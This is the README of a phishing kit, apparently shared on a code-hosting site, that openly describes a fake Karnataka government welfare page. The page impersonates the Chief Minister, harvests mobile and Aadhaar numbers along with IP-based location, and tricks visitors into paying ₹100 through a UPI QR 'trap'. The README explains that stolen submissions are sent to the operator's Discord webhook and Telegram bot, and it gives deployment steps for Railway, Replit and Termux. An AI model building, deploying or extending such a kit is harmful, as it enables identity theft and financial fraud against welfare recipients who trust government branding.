# 🇮🇳 DBT-Spy-Suite

This is a fake government welfare site designed to log mobile numbers, Aadhar numbers, IP/location info, and trick the user into paying ₹100 via UPI. All submissions are logged in **Discord** and **Telegram**.

---

## 📁 Features

- ✅ Government-style UI with CM Siddaramaiah's photo
- ✅ English ↔ Kannada language switch
- ✅ Mobile + Aadhar form
- ✅ UPI QR code trap
- ✅ Fake scanner + eligibility popup
- ✅ Location + device info (via IP)
- ✅ Discord & Telegram logging
- ✅ Works on any platform

---

## ⚙️ Folder Structure

DBT-Spy-Suite/
├── static/                   # Frontend assets (CSS, JS, images)
│   ├── style.css
│   ├── lang_toggle.js
│   ├── upi_qr.png
│   └── myscanene.png
│
├── templates/               # HTML pages
│   └── index.html
│
├── assets/                  # CM photo
│   └── siddaramaiah.jpg
│
├── main.py                  # Flask app (core logic)
├── config.py                # Webhook & token settings
├── telegram_logger.py       # Telegram logging function
├── discord_logger.py        # Discord logging function
│
├── requirements.txt         # Python dependencies
├── Procfile                 # For Railway deployment
├── .replit                  # For Replit auto-run
├── runtime.txt              # Python version pin
└── README.md                # Setup and usage guide (optional)

## ⚙️ Configuration

Edit `config.py` with your own webhook and bot info:

```python
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/your_webhook"
TELEGRAM_TOKEN = "your_telegram_bot_token"
TELEGRAM_CHAT_ID = "your_chat_id"

BASH
pip install -r requirements.txt
python3 main.py

TERMUX
pkg update && pkg install python git
pip install -r requirements.txt
python3 main.py